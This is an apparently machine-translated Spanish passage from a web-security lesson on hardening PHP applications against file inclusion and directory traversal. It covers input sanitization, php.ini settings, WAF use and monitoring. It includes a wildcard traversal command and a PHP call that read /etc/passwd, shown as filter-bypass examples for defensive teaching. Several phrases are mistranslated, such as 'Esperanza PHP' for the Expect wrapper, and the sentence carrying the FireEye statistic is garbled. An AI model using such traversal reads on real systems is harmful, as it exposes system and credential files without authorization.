Si crea su propia función para hacer este método, es posible que no tenga en cuenta un caso de borde extraño. Por ejemplo, en su terminal bash, vaya a su directorio de inicio (cd ~) y ejecute el comando `cat .?/.*/.?/etc/passwd`. Verás que Bash permite el `?` y `*` comodines para ser utilizados como `.`. Ahora escriba `php -a` para ingresar al intérprete de la Línea de Comando PHP y ejecutar `echo file_get_contents('.?/.*/.?/etc/passwd');`. Verá que PHP no tiene el mismo comportamiento con los comodines, si lo reemplaza `?` y `*` con `.`, el comando funcionará como se esperaba. Esto demuestra que hay casos de borde con nuestra función anterior, si tenemos PHP ejecutar bash con el `system()`función, el atacante podría eludir nuestra prevención de salto de directorio. Si usamos funciones nativas en el marco en el que nos encontramos, existe la posibilidad de que otros usuarios capten casos de vanguardia como este y lo arreglen antes de que se explote en nuestra aplicación web.

Además, podemos desinfectar la entrada del usuario para eliminar recursivamente cualquier intento de atravesar directorios, de la siguiente manera:

Código: php

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

Como podemos ver, este código se elimina recursivamente `../` subcadenas, incluso si la cadena resultante contiene `../` todavía lo eliminaría, lo que evitaría algunos de los desvíos que intentamos en este módulo.

---

## Configuración del Servidor Web

También se pueden utilizar varias configuraciones para reducir el impacto de las vulnerabilidades de inclusión de archivos en caso de que ocurran. Por ejemplo, deberíamos deshabilitar globalmente la inclusión de archivos remotos. En PHP esto se puede hacer configurando `allow_url_fopen` y `allow_url_include` para Fuera.

También es a menudo posible bloquear aplicaciones web en su directorio raíz web, evitando que accedan a archivos no relacionados con la web. La forma más común de hacer esto en la era actual es ejecutando la aplicación dentro `Docker`. Sin embargo, si esa no es una opción, muchos idiomas a menudo tienen una forma de evitar el acceso a archivos fuera del directorio web. En PHP eso se puede hacer agregando `open_basedir = /var/www` en el archivo php.ini. Además, debe asegurarse de que ciertos módulos potencialmente peligrosos estén desactivados, como [Esperanza PHP](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html).

Si se aplican estas configuraciones, debería impedir el acceso a archivos fuera de la carpeta de la aplicación web, por lo que incluso si se identifica una vulnerabilidad LFI, su impacto se reduciría.

---

## Firewall de Aplicaciones Web (WAF)

La forma universal de endurecer las aplicaciones es utilizar un Firewall de Aplicaciones Web (WAF), como `ModSecurity`. Cuando se trata de WAF, lo más importante a evitar son los falsos positivos y el bloqueo de solicitudes no maliciosas. ModSecurity minimiza los falsos positivos al ofrecer un `permissive` modo, que solo informará cosas que habría bloqueado. Esto permite a los defensores ajustar las reglas para asegurarse de que no se bloquee ninguna solicitud legítima. Incluso si la organización nunca quiere convertir el WAF en "modo de bloqueo", solo tenerlo en modo permisivo puede ser una señal de advertencia temprana de que su aplicación está siendo atacada.

Finalmente, es importante recordar que el propósito del endurecimiento es darle a la aplicación una carcasa exterior más fuerte, por lo que cuando ocurre un ataque, los defensores tienen tiempo para defenderse. Según el [FireEye M-Trends Informe de 2020](https://content.fireeye.com/m-trends/rpt-m-trends-2020)30 Días, el tiempo promedio que le tomó a una empresa detectar piratas informáticos. Con el endurecimiento adecuado, los atacantes dejarán muchas más señales, y la organización con suerte detectará estos eventos aún más rápido.

Es importante entender que el objetivo del endurecimiento no es hacer que su sistema no sea pirateable, lo que significa que no puede descuidar la observación de registros sobre un sistema endurecido porque es "seguro". Los sistemas endurecidos deben probarse continuamente, especialmente después de lanzar un día cero para una aplicación relacionada con su sistema (por ejemplo: Apache Struts, RAILS, Django, etc.). En la mayoría de los casos, el día cero funcionaría, pero gracias al endurecimiento, puede generar registros únicos, lo que permitió confirmar si el exploit se usó contra el sistema o no.